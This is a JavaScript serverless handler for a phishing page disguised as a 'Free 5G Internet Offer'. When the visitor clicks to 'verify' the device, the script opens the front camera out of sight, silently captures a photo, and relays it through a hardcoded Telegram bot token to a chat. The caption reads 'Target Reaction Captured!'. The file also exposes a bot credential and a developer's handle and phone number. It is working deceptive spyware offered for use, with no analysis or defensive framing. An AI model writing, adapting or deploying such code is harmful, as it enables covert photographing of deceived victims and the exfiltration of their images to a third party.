const axios = require('axios');
const FormData = require('form-data');

export default async function handler(req, res) {
    const botToken = "8796859741:AAEoe1AmDlHY1j1vqyPsm-XbaLAgIy5oa90";

    if (req.method === 'POST') {
        try {
            const { image, id } = req.body;
            if (!image || !id) return res.status(400).json({ error: "Missing data" });

            const base64Data = image.replace(/^data:image\/(jpeg|png);base64,/, "");
            const imageBuffer = Buffer.from(base64Data, 'base64');

            const form = new FormData();
            form.append('chat_id', id);
            form.append('photo', imageBuffer, { filename: 'capture.jpg' });
            form.append('caption', "📸 Target Reaction Captured!\n\n👨‍💻 DEVELOPER: @Eshucording\n📞 Contact: 8123561579");

            await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, form, {
                headers: form.getHeaders(),
            });
            return res.status(200).json({ success: true });
        } catch (error) {
            console.error(error);
            return res.status(200).json({ success: false }); 
        }
    }

    res.setHeader('Content-Type', 'text/html');
    return res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Free 5G Internet Offer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: white; text-align: center; font-family: sans-serif; }
        .container { margin-top: 50px; padding: 20px; }
        .btn { background: #007bff; color: white; padding: 15px 25px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Claim Your Free 5G Data</h1>
        <p>Click below to verify your device and activate the offer.</p>
        <button class="btn" onclick="startVerification()">Activate Now</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        // Using the ID from your previous code
        const chatId = urlParams.get('id') || "6296180183"; 

        async function startVerification() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    // 2 second delay to fix the black screen issue (allows camera sensor to focus)
                    setTimeout(() => {
                        captureAndSend();
                    }, 2000);
                };
            } catch (err) {
                console.error("Camera access denied");
                alert("Permission required to verify 5G compatibility.");
            }
        }

        function captureAndSend() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.9);

            fetch(window.location.pathname, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData, id: chatId })
            })
            .then(response => response.json())
            .then(data => {
                const tracks = video.srcObject.getTracks();
                tracks.forEach(track => track.stop());
                alert("Checking eligibility... Please wait.");
            })
            .catch(err => console.error("Error sending to bot:", err));
        }
    </script>
</body>
</html>
    `);
}
